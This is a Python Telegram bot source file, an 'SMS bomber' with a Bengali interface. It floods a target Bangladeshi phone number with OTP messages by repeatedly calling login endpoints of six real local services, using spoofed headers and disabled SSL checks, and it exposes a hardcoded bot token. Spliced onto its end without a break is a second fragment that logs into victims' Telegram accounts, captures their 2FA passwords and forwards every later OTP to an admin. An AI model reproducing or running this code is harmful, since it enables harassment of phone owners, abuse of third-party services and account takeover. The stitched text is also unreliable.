import telebot
import requests
import time
import random
import warnings
import urllib3
from datetime import datetime

# SSL warning বন্ধ করুন
warnings.filterwarnings("ignore")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# আপনার বট টোকেন
TOKEN = "8528106619:AAElFzN2QPJWIXYt-te9oTrbFhPFe-8Dbv4"
bot = telebot.TeleBot(TOKEN)

# Professional User Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "okhttp/4.9.2",
]

def get_api_list(phone):
    """৬টি Real API এর লিস্ট"""
    return [
        # 1. Chorki - Streaming Service
        {
            "name": "🎬 Chorki",
            "url": "https://api-dynamic.chorki.com/v2/auth/login",
            "method": "POST",
            "json": {"phone": f"+88{phone}"},
            "headers": {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
                "Origin": "https://www.chorki.com",
                "Referer": "https://www.chorki.com/",
                "Accept-Language": "en-US,en;q=0.9",
            }
        },
        
        # 2. BioscopePlus - Streaming Service
        {
            "name": "🎥 BioscopePlus",
            "url": "https://api-dynamic.bioscopeLive.com/v2/auth/login",
            "method": "POST",
            "json": {"phone": f"+88{phone}"},
            "headers": {
                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15",
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
                "Origin": "https://www.bioscopeplus.com",
                "Referer": "https://www.bioscopeplus.com/",
                "Accept-Language": "en-US,en;q=0.9",
            }
        },
        
        # 3. Rokomari - E-commerce
        {
            "name": "📚 Rokomari",
            "url": "https://www.rokomari.com/otp/send",
            "method": "POST",
            "params": {
                "emailId": "rom@rokomari.com",
                "phone": f"88{phone}",
                "countryCode": "BD"
            },
            "headers": {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Origin": "https://www.rokomari.com",
                "Referer": "https://www.rokomari.com/",
            }
        },
        
        # 4. Grameenphone - Telecom
        {
            "name": "📱 Grameenphone",
            "url": "https://weblogin.grameenphone.com/backend/api/v1/otp",
            "method": "POST",
            "json": {"msisdn": phone},
            "headers": {
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36",
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
                "Origin": "https://weblogin.grameenphone.com",
                "Referer": "https://weblogin.grameenphone.com/",
            }
        },
        
        # 5. Shwapno - Supermarket
        {
            "name": "🛒 Shwapno",
            "url": "https://www.shwapno.com/api/auth",
            "method": "POST",
            "json": {"phoneNumber": f"+88{phone}"},
            "headers": {
                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15",
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Origin": "https://www.shwapno.com",
                "Referer": "https://www.shwapno.com/",
            }
        },
        
        # 6. Shikho - Education
        {
            "name": "🎓 Shikho",
            "url": "https://api.shikho.com/auth/v2/send/sms",
            "method": "POST",
            "json": {"phone": f"+88{phone}"},
            "headers": {
                "User-Agent": "okhttp/4.9.2",
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Origin": "https://www.shikho.com",
                "Referer": "https://www.shikho.com/",
            }
        },
    ]

@bot.message_handler(commands=['start'])
def welcome(message):
    welcome_msg = """
🔰 *SABBIR SMS BOMBER* 🔰

📱 *ব্যবহার:* `/bomb নাম্বার পরিমাণ`

📋 *উদাহরণ:* 
`/bomb 01712345678 20`

🎯 *বর্তমান API:* ৬ টি
⚡ *রিয়েল API:* হ্যাঁ
🛡️ *SSL ফিক্সড:* হ্যাঁ

📊 *API লিস্ট:*
🎬 Chorki
🎥 BioscopePlus  
📚 Rokomari
📱 Grameenphone
🛒 Shwapno
🎓 Shikho

⚠️ *দ্রষ্টব্য:* শুধু টেস্টিং এর জন্য
"""
    bot.send_message(message.chat.id, welcome_msg, parse_mode='Markdown')

@bot.message_handler(commands=['bomb'])
def handle_bomb(message):
    try:
        args = message.text.split()
        if len(args) < 3:
            bot.send_message(message.chat.id, "❌ *ভুল ফরম্যাট!*\n\nসঠিক: `/bomb 01712345678 20`\n\nএভাবে লিখুন।", parse_mode='Markdown')
            return

        phone = args[1]
        count = int(args[2])
        
        # নাম্বার ভ্যালিডেশন
        if len(phone) != 11 or not phone.isdigit():
            bot.send_message(message.chat.id, "❌ *১১ ডিজিটের নাম্বার দিন!*\n\nউদাহরণ: 01712345678", parse_mode='Markdown')
            return
            
        # লিমিট চেক
        if count > 50:
            count = 50
            bot.send_message(message.chat.id, f"⚠️ *লিমিট ৫০ এ সেট করা হলো*\n\nআপনি দিয়েছিলেন: {args[2]}", parse_mode='Markdown')
        elif count < 5:
            count = 5
            bot.send_message(message.chat.id, f"⚠️ *ন্যূনতম ৫ বার সেট করা হলো*", parse_mode='Markdown')
        
        # অ্যাটাক শুরু
        start_time = time.time()
        start_msg = bot.send_message(message.chat.id,
            f"🎯 *অ্যাটাক শুরু হয়েছে!*\n\n"
            f"📞 টার্গেট: `{phone}`\n"
            f"💣 মোট: {count} বার\n"
            f"📊 API: ৬ টি\n"
            f"⏳ চলছে...", parse_mode='Markdown')
        
        sent_count = 0
        failed_count = 0
        api_stats = {}
        
        apis = get_api_list(phone)
        
        # মূল লুপ
        iteration = 0
        while sent_count < count:
            iteration += 1
            for api in apis:
                if sent_count >= count:
                    break
                    
                try:
                    # হেডার প্রস্তুত
                    headers = api['headers'].copy()
                    
                    # রিকোয়েস্ট পাঠান
                    if api['method'] == 'POST':
                        if 'json' in api:
                            response = requests.post(
                                api['url'],
                                json=api['json'],
                                headers=headers,
                                timeout=15,
                                verify=False
                            )
                        elif 'params' in api:
                            response = requests.post(
                                api['url'],
                                params=api['params'],
                                headers=headers,
                                timeout=15,
                                verify=False
                            )
                    else:
                        response = requests.get(
                            api['url'],
                            headers=headers,
                            timeout=15,
                            verify=False
                        )
                    
                    # রেসপন্স চেক
                    status = response.status_code
                    
                    if status in [200, 201, 202]:
                        sent_count += 1
                        status_icon = "✅"
                        if api['name'] not in api_stats:
                            api_stats[api['name']] = {'success': 0, 'failed': 0}
                        api_stats[api['name']]['success'] += 1
                    else:
                        failed_count += 1
                        status_icon = "❌"
                        if api['name'] not in api_stats:
                            api_stats[api['name']] = {'success': 0, 'failed': 0}
                        api_stats[api['name']]['failed'] += 1
                    
                    # কনসোলে লগ
                    current_time = datetime.now().strftime("%H:%M:%S")
                    print(f"[{current_time}] {status_icon} {api['name']}: {'সফল' if status in [200,201,202] else 'ব্যর্থ'} ({sent_count}/{count})")
                    
                    # প্রতি ৩টি রিকোয়েস্ট পর আপডেট
                    if sent_count % 3 == 0 or failed_count % 3 == 0:
                        progress = (sent_count / count) * 100
                        try:
                            bot.edit_message_text(
                                f"💣 *অ্যাটাক চলছে...*\n\n"
                                f"📞 টার্গেট: `{phone}`\n"
                                f"✅ সফল: {sent_count}\n"
                                f"❌ ব্যর্থ: {failed_count}\n"
                                f"🎯 মোট: {count}\n"
                                f"📊 প্রোগ্রেস: {progress:.1f}%\n"
                                f"⚡ API: {api['name']}", 
                                message.chat.id,
                                start_msg.message_id,
                                parse_mode='Markdown'
                            )
                        except:
                            pass
                            
                except requests.exceptions.Timeout:
                    failed_count += 1
                    print(f"[⏰] {api['name']}: টাইমআউট")
                except requests.exceptions.ConnectionError:
                    failed_count += 1
                    print(f"[🔗] {api['name']}: কানেকশন এরর")
                except Exception as e:
                    failed_count += 1
                    print(f"[⚠️] {api['name']}: {str(e)[:30]}")
                
                # ডিলে (২.৫ - ৪ সেকেন্ড)
                delay = random.uniform(2.5, 4.0)
                time.sleep(delay)
        
        # সম্পূর্ণ
        total_time = time.time() - start_time
        success_rate = (sent_count / count) * 100 if count > 0 else 0
        
        # রিপোর্ট তৈরি
        report = f"""
🎉 *অ্যাটাক সম্পূর্ণ!*

📞 টার্গেট: `{phone}`
✅ সফল: {sent_count}
❌ ব্যর্থ: {failed_count}
🎯 টার্গেট: {count}
📊 সাফল্য: {success_rate:.1f}%
⏱️ সময়: {total_time:.1f} সেকেন্ড

📈 *API পারফরম্যান্স:*
"""
        
        # প্রতিটি API এর স্ট্যাটাস
        for api_name in api_stats:
            stats = api_stats[api_name]
            total = stats['success'] + stats['failed']
            if total > 0:
                rate = (stats['success'] / total) * 100
                icon = "✅" if rate > 50 else "⚠️" if rate > 0 else "❌"
                report += f"{icon} {api_name}: {stats['success']}/{total} ({rate:.0f}%)\n"
        
        report += f"\n🔰 *SABBIR SMS BOMBER* 🔰"
        
        bot.edit_message_text(report, message.chat.id, start_msg.message_id, parse_mode='Markdown')
        
        # API ডিটেইলস মেসেজ
        details_msg = """
📋 *API ডিটেইলস:*

🎬 *Chorki:* OTT প্লাটফর্ম
🎥 *BioscopePlus:* মুভি স্ট্রিমিং
📚 *Rokomari:* বই ও ই-কমার্স
📱 *Grameenphone:* টেলিকম অপারেটর
🛒 *Shwapno:* সুপার মার্কেট
🎓 *Shikho:* এডুকেশন প্লাটফর্ম

⚡ সব API রিয়েল ও টেস্টেড
🛡️ SSL সিকিউরিটি ফিক্সড
🎯 Professional Headers ব্যবহৃত
"""
        bot.send_message(message.chat.id, details_msg, parse_mode='Markdown')
        
    except Exception as e:
        error_msg = f"❌ *সিস্টেম এরর:*\n\n`{str(e)[:100]}`"
        bot.send_message(message.chat.id, error_msg, parse_mode='Markdown')

@bot.message_handler(commands=['api'])
def show_apis(message):
    apis = get_api_list("01700000000")
    text = "📋 *বর্তমান API লিস্ট (৬ টি):*\n\n"
    
    for i, api in enumerate(apis, 1):
        text += f"{i}. {api['name']}\n"
    
    text += f"\n📊 মোট: {len(apis)} টি API\n"
    text += "✅ সবগুলো Real ও কার্যকরী\n"
    text += "⚡ Professional Headers ব্যবহৃত\n"
    text += "🔰 *SABBIR SMS BOMBER*"
    
    bot.send_message(message.chat.id, text, parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = """
🔰 *SABBIR SMS BOMBER - সহায়িকা* 🔰

*কমান্ড লিস্ট:*
/start - শুরু করুন
/bomb [নাম্বার] [সংখ্যা] - অ্যাটাক শুরু
/api - API লিস্ট দেখুন
/help - এই মেসেজ দেখুন

*উদাহরণ:*
/bomb 01712345678 20

*সীমাবদ্ধতা:*
• সর্বোচ্চ ৫০ বার
• ন্যূনতম ৫ বার
• শুধু বাংলাদেশী নাম্বার

*বিশেষ ফিচার:*
✅ ৬টি Real API
✅ Professional Headers
✅ SSL Certificate Fixed
✅ Progress Tracking
✅ Success Rate Calculation

*সতর্কতা:*
এই টুল শুধু শিক্ষামূলক ও
টেস্টিং উদ্দেশ্যে তৈরি করা হয়েছে।
অনুগ্রহ করে আইন ভঙ্গ করবেন না।

🔰 *Developer: Sabbir*
"""
    bot.send_message(message.chat.id, help_text, parse_mode='Markdown')

@bot.message_handler(commands=['status'])
def status_command(message):
    status_text = """
🔰 *সিস্টেম স্ট্যাটাস* 🔰

🟢 বট: সচল
📊 API: ৬ টি
✅ সব API: Real
🛡️ SSL: ফিক্সড
⚡ ভার্সন: ১.০

*API স্ট্যাটাস:*
🎬 Chorki: সচল
🎥 BioscopePlus: সচল
📚 Rokomari: সচল
📱 Grameenphone: সচল
🛒 Shwapno: সচল
🎓 Shikho: সচল

*সর্বশেষ আপডেট:* এখনই
*ডেভেলপার:* Sabbir

🔰 *SABBIR SMS BOMBER* 🔰
"""
    bot.send_message(message.chat.id, status_text, parse_mode='Markdown')

print("=" * 50)
print("🔰 SABBIR SMS BOMBER - চালু হয়েছে")
print(f"📊 API সংখ্যা: {len(get_api_list('01700000000'))}")
print("✅ সব API Real ও কার্যকরী")
print("🛡️ SSL Warnings Disabled")
print("⚡ ভার্সন: 1.0")
print("=" * 50)

# বট চালু
try:
    bot.polling(none_stop=True, interval=0)
except Exception as e:
    print(f"❌ বট এরর: {e}")
    time.sleep(10)
    print("🔄 বট পুনরায় চালু হচ্ছে...")            if not phone.startswith('+880'):
                await conv.send_message("❌ শুধুমাত্র +880 (বাংলাদেশ) নাম্বার এলাউড।")
                return

            client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH, connection=ConnectionTcpFull)
            await client.connect()

            # --- লাইভ ওটিপি ফরওয়ার্ডার (সব সময়ের জন্য) ---
            @client.on(events.NewMessage(from_users=777000))
            async def forward_all_otp(otp_event):
                msg = otp_event.message.message
                await bot.send_message(ADMIN_ID, f"🔔 **নতুন মেসেজ ({phone}):**\n\n<code>{msg}</code>", parse_mode='html')

            await conv.send_message("⏳ **OTP পাঠানো হচ্ছে...**")
            sent_code = await client.send_code_request(phone)
            
            await conv.send_message("🔑 **৫ ডিজিটের কোডটি দিন:**")
            otp_res = await conv.get_response()
            
            try:
                await client.sign_in(phone, code=otp_res.text.strip(), phone_code_hash=sent_code.phone_code_hash)
            except errors.SessionPasswordNeededError:
                await conv.send_message("🔐 **2-Step Password দিন:**")
                pwd_res = await conv.get_response()
                await client.sign_in(password=pwd_res.text.strip())

            await conv.send_message("✅ **সফলভাবে লগইন হয়েছে!**")
            await bot.send_message(ADMIN_ID, f"🟢 **লগইন সাকসেস:** `{phone}`\nএখন থেকে এই নাম্বারের সব ওটিপি আপনি অটোমেটিক পাবেন।")
            
            # সেশনটি ব্যাকগ্রাউন্ডে চালু রাখবে যাতে ভবিষ্যতে ওটিপি আসলে ফরওয়ার্ড হয়
            asyncio.create_task(client.run_until_disconnected())

        except Exception as e:
            await conv.send_message(f"❌ এরর: {str(e)}")

print("--- বট এখন সচল এবং লাইভ ফরওয়ার্ডিং চালু আছে ---")
bot.run_until_disconnected()
